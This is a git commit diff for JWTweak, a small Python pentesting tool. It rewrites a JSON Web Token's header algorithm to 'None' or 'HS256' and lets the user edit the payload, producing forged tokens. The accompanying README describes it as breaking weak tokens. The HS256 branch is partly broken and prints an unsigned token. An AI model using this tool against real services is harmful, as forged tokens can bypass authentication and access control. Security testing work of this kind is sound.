9eead9aa73db216734a2d35262d42d9b2e8a973f
root <root@mail.gugel.com>
2020-04-28 01:09:57 +0530

    Feature added

--- JWTweak.py
+++ JWTweak.py
@@ -1,4 +1,4 @@
-#JWTweak-v0.1
+#JWTweak-v0.2
 
 import jwt
 import re
@@ -27,17 +27,41 @@ def jwtWeak():
         
 
         choice = input("""
-                      A: Base 64 Decode the input JWT [This Build]
-                      B: Generate new JWT Token by changing the Algorithm of the input JWT to 'None'[This Build]
-                      C: Generate new JWT Token by changing the Algorithm of the input JWT to 'HS256'[Next update]
-                      D: Generate new JWT Token by changing the Algorithm of the input JWT to 'HS384'[Next update]
-                      E: Generate new JWT Token by changing the Algorithm of the input JWT to 'HS512'[Next update]
+                      A: Detect the algorithm of the input JWT Token
+                      B: Base64 decode the input JWT Token
+                      C: Generate new JWT Token by changing the algorithm of the input JWT to 'None'
+                      D: Generate new JWT Token by changing the algorithm of the input JWT to 'HS256'
+                      E: Generate new JWT Token by changing the algorithm of the input JWT to 'HS384'
+                      F: Generate new JWT Token by changing the algorithm of the input JWT to 'HS512'
                       Q: Quit/Log Out
 
                       Please enter your choice: """+f"{bcolors.ENDC}")
         print (f"{bcolors.BOLD}***********************************************************************************************************{bcolors.ENDC}")
+
 #######################################################################################
-        if choice == "A" or choice =="a":
+#Detect the algorithm of the input JWT Token
+#######################################################################################
+        if choice == "A" or choice =="a":  
+            part_jwt=in_jwt.split('.')
+            Header=part_jwt[0]
+            if len(Header) % 4 != 0: #check if multiple of 4
+                while len(Header) % 4 != 0:
+                    Header = Header + "="
+                req_str = base64.b64decode(Header)
+            else:
+                req_str = base64.b64decode(Header)
+                req_str=req_str.decode('utf-8')
+            json_header = json.loads(req_str)
+            algo=json_header['alg']
+            print(f"{bcolors.OKGREEN}\nThe present algorithm of input JWT Token- "+f"{bcolors.BOLD}"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}\n\n")
+
+
+
+
+#######################################################################################
+#Base 64 Decode JWT
+#######################################################################################
+        elif choice == "B" or choice =="b":
             part_jwt=in_jwt.split('.')
             Header=part_jwt[0]
             Payload=part_jwt[1]
@@ -60,7 +84,7 @@ def jwtWeak():
                 req_str = base64.b64decode(Header)
             else:
                 req_str = base64.b64decode(Header)
-            req_str=req_str.decode('utf-8')
+                req_str=req_str.decode('utf-8')  
             #base64 decoded Header    
             print("\n\tHeader="+str(req_str))
             
@@ -71,7 +95,7 @@ def jwtWeak():
                 req_str = base64.b64decode(Payload)
             else:
                 req_str = base64.b64decode(Payload)
-            req_str=req_str.decode('utf-8')
+            req_str=req_str.decode('utf-8')            
             #base64 decoded Payload    
             print("\n\tPayload="+str(req_str))    
             
@@ -84,8 +108,12 @@ def jwtWeak():
                 req_str = base64.b64decode(Signature)         
             #base64 decoded Signature 
             print("\n\tSignature="+str(req_str))
-#######################################################################################              
-        elif choice == "B" or choice =="b":  
+            
+#######################################################################################    
+#Generate JWT Token with Algorithm type 'None'
+#######################################################################################          
+    
+        elif choice == "C" or choice =="c":  
             part_jwt=in_jwt.split('.')
             Header=part_jwt[0]
             Payload=part_jwt[1]
@@ -100,7 +128,7 @@ def jwtWeak():
                 req_str=req_str.decode('utf-8')
             json_header = json.loads(req_str)
             algo=json_header['alg']
-            print(f"{bcolors.UNDERLINE}\n\tThe present algorithm - "+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
+            print(f"{bcolors.HEADER}\n\tThe present algorithm - "+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
 
             #base64 encoded Header
             print("\n\tHeader="+Header)
@@ -112,6 +140,8 @@ def jwtWeak():
             print(f"{bcolors.WARNING}\n\tAfter Algorithm Changed to 'None':{bcolors.ENDC}")
             
             json_header['alg']='None'
+            
+            json_header=json.dumps(json_header)
             
             print("\n\tModified Header(Plain Text)="+str(json_header))
             if len(Payload) % 4 != 0: #check if multiple of 4
@@ -146,19 +176,85 @@ def jwtWeak():
                 b64_encoded_Payload = str(b64_Payload, "utf-8")
                 print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'None':\n\t"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
             else:
-                print("Not Valid Payload") 
-                
+                print("Not Valid Payload")    
+                                        
+#######################################################################################    
+#Generate JWT Token with Algorithm type 'HS256'
+#######################################################################################  
+                                         
+        elif choice == "D" or choice =="d":
+            part_jwt=in_jwt.split('.')
+            Header=part_jwt[0]
+            Payload=part_jwt[1]
+            Signature=part_jwt[2]
+            print(f"{bcolors.WARNING}\n\tBefore Algorithm Coversion:{bcolors.ENDC}")
+            if len(Header) % 4 != 0: #check if multiple of 4
+                while len(Header) % 4 != 0:
+                    Header = Header + "="
+                req_str = base64.b64decode(Header)
+            else:
+                req_str = base64.b64decode(Header)
+                req_str=req_str.decode('utf-8')
+            json_header = json.loads(req_str)
+            algo=json_header['alg']
+            print(f"{bcolors.HEADER}\n\tThe present algorithm - "+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
+
+            #base64 encoded Header
+            print("\n\tHeader="+Header)
+            #base64 encoded Payload  
+            print("\n\tPayload="+Payload)
+            #base64 encoded Signature
+            print("\n\tSignature="+Signature) 
             
-             
-#######################################################################################                               
-        #elif choice == "C" or choice =="c"
+            print(f"{bcolors.WARNING}\n\tAfter Algorithm Changed to 'HS256':{bcolors.ENDC}")
+            
+            json_header['alg']='HS256'
+            
+            print("\n\tModified Header(Plain Text)="+str(json_header))
+            if len(Payload) % 4 != 0: #check if multiple of 4
+                while len(Payload) % 4 != 0:
+                    Payload = Payload + "="
+                req_str = base64.b64decode(Payload)
+            else:
+                req_str = base64.b64decode(Payload)
+            b64decoded_payload=req_str.decode('utf-8')
+            json_payload=json.loads(b64decoded_payload)
+            #base64 decoded Payload    
+            print("\n\tPayload(Plain Text)="+str(json_payload)) 
+            
+            
+            print("\n\tPlease provide the modified Payload(plain text) [if not, press ENTER]:")
+            mod_payload=input()
+            if re.match(r'(.*?)(?:")',mod_payload):
+                print("\n\tModified payload is:"+mod_payload)
+               # json_mod_payload=
+                json_header=str(json_header)
+                b64_Header = base64.b64encode(json_header.encode("utf-8"))
+                b64_encoded_header = str(b64_Header, "utf-8")
+                mod_payload=str(mod_payload)
+                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
+                b64_encoded_Payload = str(b64_Payload, "utf-8") 
+                encoded_HS256 = jwt.encode(mod_payload, 'adadwfff', algorithm='HS256')  
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS256':\n\t"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+            elif not mod_payload:
+                print(f"{bcolors.OKBLUE}\n\tThe payload is unchanged{bcolors.ENDC}")
+                json_header=str(json_header)
+                b64_Header = base64.b64encode(json_header.encode("utf-8"))
+                b64_encoded_header = str(b64_Header, "utf-8")
+                b64decoded_payload=str(b64decoded_payload)
+                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
+                b64_encoded_Payload = str(b64_Payload, "utf-8")
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS256':\n\t"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+            else:
+                print("Not Valid Payload") 
+            
 #######################################################################################
-        #elif choice=="D" or choice=="d"
+        #elif choice=="E" or choice=="e"
 #######################################################################################
         #elif choice=="Q" or choice=="q"
          #SS       sys.exit
         else:
-            print("You must only select either A,B,C,D or E.")
+            print("You must only select either A,B,C,D,E or F.")
             print("Please try again")
                 
     
--- README.md
+++ README.md
@@ -4,8 +4,8 @@
 This tool is basically designed to automate the progress of changing the JWT algorithm of input JWT Token and then generate the new JWT based on changed algorithm.
 
 #### Advantages
-- Check how strong is the JWT Token.
-- Break JWT Token which supports either algorithm 'None' or 'HS256/384/512'
+- Detect the JWT Algorithm
+- Generate the new JWT Token by coverting the algorithm to either 'None' or 'HS256/384/512' easily.
 
 ### Changelogs
 #### Version-0.1 (27-Apr-2020)
@@ -13,6 +13,11 @@ This tool is basically designed to automate the progress of changing the JWT alg
 Now 2 features Supports
 - Base64 decode the input JWT Token
 - Generate new JWT Token by changing algorthim to `None`
+
+#### Version-0.2 (28-Apr-2020)
+#### Feature
+Now 1 feature added
+- Option to Detect the algorithm of the input JWT
 
 ### Read more
 - [JWT Attack Walk-Through-NCC Group](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/)
